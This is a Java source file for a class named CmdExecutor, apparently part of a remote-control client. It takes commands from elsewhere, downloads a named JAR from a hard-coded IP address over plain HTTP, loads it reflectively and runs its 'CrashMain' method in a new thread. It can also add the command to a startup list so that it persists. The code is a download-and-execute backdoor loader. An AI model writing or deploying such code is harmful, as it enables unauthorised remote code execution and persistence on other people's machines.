import javax.swing.*;
import java.io.*;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLConnection;

public class CmdExecutor {
    private String cmd;
    public String funcName;
    private String parameter;
    private boolean isStartUp = false;
    public Thread task;
    //功能类名
    private String className;
    private final String methodName = "CrashMain";

    CmdExecutor(String cmd) {
        try {
            this.cmd = cmd;
            System.out.println("命令为： " + cmd);
            if (cmd.indexOf("-") == -1){
                return;
            }
            String[] cmds = cmd.split("-");

            funcName = cmds[0];//获取功能名

            className = "Function." + funcName;

            if (cmds.length == 3) {
                //判断是否开机自启
                if (cmds[1].equals("n")) {
                    isStartUp = false;
                } else if (cmds[1].equals("y")) {
                    isStartUp = true;
                }

                parameter = cmds[2];//获取参数
            }

        } catch (Exception e) {
        //    ShowDialog(e.toString());
        }

    }

    public void execute() {
        String jarName = funcName + ".jar";
        //功能不存在先下载
        if (!new File(Client.JarPath + jarName).exists()) {
            try {
                String link = "http://43.136.173.162:11451/Seewo/Jar/" + jarName;//拼接链接
                URL url = new URL(link);
                URLConnection conn = url.openConnection();
                InputStream inputStream = new BufferedInputStream(conn.getInputStream());
                OutputStream outputStream = new BufferedOutputStream(new FileOutputStream(Client.JarPath + jarName));
                byte[] buffer = new byte[1024];
                int len;
                while ((len = inputStream.read(buffer)) > 0) {
                    outputStream.write(buffer, 0, len);
                }
                outputStream.flush();
                inputStream.close();
                outputStream.close();

                invoke();
            } catch (FileNotFoundException e) {
                ShowDialog("功能不存在！");
                return;
            } catch (Exception e) {
                ShowDialog(e.toString());
            }
        } else {
            invoke();
        }
    }

    public void stop() {
        task.stop();
        if (isStartUp){
            synchronized (Client.lock){
                String oldTask = FileUtil.readStringFromtxt(Client.JarPath+"StartUp.txt");
                String newTask = oldTask.replace(cmd,"");
                FileUtil.writeStringToTxt(Client.JarPath+"StartUp.txt",newTask);
            }
        }
    }

    private void ShowDialog(String content) {
        JOptionPane.showMessageDialog(null, content);
    }

    private void invoke() {
        if (isStartUp){
            synchronized (Client.lock){
                String oldTask = FileUtil.readStringFromtxt(Client.JarPath+"StartUp.txt");
                String newTask = oldTask+"\n"+cmd;
                FileUtil.writeStringToTxt(Client.JarPath+"StartUp.txt",newTask);
            }
        }
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                URLClassLoader classLoader = null;
                try {
                    classLoader = new URLClassLoader(new URL[]{new URL("file:" + Client.JarPath + funcName + ".jar")});
                    Class<?> exampleClass = classLoader.loadClass(className);
                    Method exampleMethod = exampleClass.getDeclaredMethod(methodName, String.class);
                    exampleMethod.invoke(exampleClass.newInstance(), parameter);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
        thread.start();
        task = thread;

    }
}
